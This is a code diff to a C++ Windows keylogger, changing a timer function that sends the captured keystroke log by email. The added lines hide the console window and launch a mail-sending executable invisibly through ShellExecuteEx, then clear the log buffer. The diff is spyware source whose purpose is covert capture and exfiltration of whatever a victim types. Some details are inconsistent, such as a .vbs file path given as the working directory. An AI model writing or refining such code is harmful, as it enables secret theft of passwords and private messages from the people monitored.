@@ -4,6 +4,9 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <vector>
+#include <stdlib.h>
+#include <stdio.h>
 #include "windows.h"
 #include "KeyConstants.h"
 #include "Timer.h"
@@ -27,13 +30,24 @@ void TimerSendMail()
     //Send file using python script
     //TO DO Find directory of exe
     //TO DO Launch Python exe with no terminal
-    //const char* home_dir = getenv("USERPROFILE");
-    //std::string text_dir = home_dir.str();
-    //std::string command = "explorer " << text_dir << "\\AppData\\Roaming\\Microsoft\\Install\\main.exe";
+    const char* home_dir = getenv("USERPROFILE");
+    std::string dir = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe";
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
-    system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
     FreeConsole();
-    //system(command);
+    //system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
+    //Launch VBS File
+    SHELLEXECUTEINFO shExecInfo;
+    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+    shExecInfo.hwnd = NULL;
+    shExecInfo.lpVerb = "open";
+    shExecInfo.lpFile = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe";
+    shExecInfo.lpParameters = NULL;
+    shExecInfo.lpDirectory = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\activate.vbs";
+    shExecInfo.nShow = SW_HIDE;//Visibility off
+    shExecInfo.hInstApp = NULL;
+    //Execute
+    ShellExecuteEx(&shExecInfo);
+
     keylog = "";
     Helper::WriteAppLog("Email Sent");
 }
